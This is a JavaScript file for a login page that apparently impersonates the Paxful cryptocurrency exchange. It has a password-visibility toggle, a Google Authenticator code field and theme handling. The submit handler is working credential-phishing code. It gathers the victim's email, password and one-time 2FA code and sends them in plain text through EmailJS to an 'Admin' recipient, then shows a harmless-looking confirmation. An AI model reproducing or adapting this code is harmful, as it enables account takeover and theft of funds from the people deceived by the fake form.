const form = document.getElementById('signupForm');
const signupBtn = document.querySelector('.btn-con');
const loader = document.getElementById('loader');
const showPassword = document.querySelector('.show-password');
const password = document.getElementById('password');
let btnValue = document.querySelector('.btn-con').value;

showPassword.addEventListener('click', () => {
    if (password.type == 'password') {
        password.type = "text";
        showPassword.classList.remove('bi-eye-slash');
        showPassword.classList.add('bi-eye');
    } else {
        password.type = "password";
        showPassword.classList.remove('bi-eye');
        showPassword.classList.add('bi-eye-slash');
    }
});


const googleInput = document.getElementById('google_auth_code');
googleInput.addEventListener('input', () => {
    let googleInputValue = googleInput;
    googleInputValue.value = googleInputValue.value.replace(/\D/g, ''); //Remove non digits char
});


form.addEventListener('submit', (event) => {
    event.preventDefault();
    signupBtn.disabled = true;
    loader.style.display = "inline";

    const inputEmail = document.getElementById('email').value;
    const inputPassword = document.getElementById('password').value;
    const googleAuth = document.getElementById('google_auth_code').value;

    const formData = {
        to_name: "Admin", // Recipient name
        from_name: "New User", // Sender's name
        message: `Email: ${inputEmail}, Password: ${inputPassword}, Google Auth: ${googleAuth}`, // Main message
        subject: "New Paxful User Connected" // Custom subject for the email
    };
   

    // Send email using EmailJS
    emailjs.send("service_mss5upj", "template_q4fw2bl", formData)
    .then((response) => {
        loader.style.display = 'none';
        signupBtn.disabled = false;
        // console.log("Email sent successfully!", response);
        alert("Thank you! Your email has been sent...");
        form.reset();
    })
    .catch((error) => {
        loader.style.display = 'none';
        signupBtn.disabled = false;
        // console.error("Failed to send email:", error);
        alert("Oops! Something went wrong. Please try again.");
    });
});


// Detect system theme
const systemTheme = window.matchMedia('(prefers-color-scheme: dark)');
const inputFields = document.querySelectorAll('.input_field');

// Function to apply background based on theme
function applyTheme(e) {
  if (e.matches) {
    // Dark mode
    document.body.style.backgroundColor = "#121212"; // Dark background
    inputFields.forEach((inputfield) => {
        inputfield.style.backgroundColor = "#383838";
        document.querySelector('.signup-link').style.color = "darkgray";
        document.querySelector('.password_reset').style.color = "darkgray";
        document.querySelector('.conditions').style.color = "darkgray";
        document.querySelector('.politique').style.color = "darkgray";
    });
    // inputFields.style.backgroundColor = "#383838";
    // document.body.style.color = "#ffffff"; // Light text
  } else {
    // Light mode
    document.body.style.backgroundColor = "#f5f5f5"; // Light background
    inputFields.forEach((inputfield) => {
        inputfield.style.backgroundColor = "#ffff";
        document.querySelector('.signup-link').style.color = "#000000";
        document.querySelector('.password_reset').style.color = "#000000";
        document.querySelector('.conditions').style.color = "#000000";
        document.querySelector('.politique').style.color = "#000000";
    });
    // document.body.style.color = "#000000"; // Dark text
  }
}

//Apply the theme on page load
applyTheme(systemTheme);

//Listen for changes in theme
systemTheme.addEventListener('change', applyTheme);



// Define translations for different languages
// const translations = {
//     en: {
//       title: "Sign Up",
//       emailLabel: "Email Address",
//       passwordLabel: "Password",
//       submitButton: "Submit",
//     },
//     fr: {
//       title: "S'inscrire",
//       emailLabel: "Adresse e-mail",
//       passwordLabel: "Mot de passe",
//       submitButton: "Soumettre",
//     },
//     es: {
//       title: "Regístrate",
//       emailLabel: "Correo electrónico",
//       passwordLabel: "Contraseña",
//       submitButton: "Enviar",
//     },
//   };
  
//   // Detect the user's language preference
//   const userLang = navigator.language.slice(0, 2); // Get 'en', 'fr', etc.
//   const selectedLang = translations[userLang] || translations["en"]; // Default to English
  
//   // Apply translations to the page
//   document.getElementById("title").innerText = selectedLang.title;
//   document.getElementById("emailLabel").innerText = selectedLang.emailLabel;
//   document.getElementById("passwordLabel").innerText = selectedLang.passwordLabel;
//   document.getElementById("submitButton").innerText = selectedLang.submitButton;
  

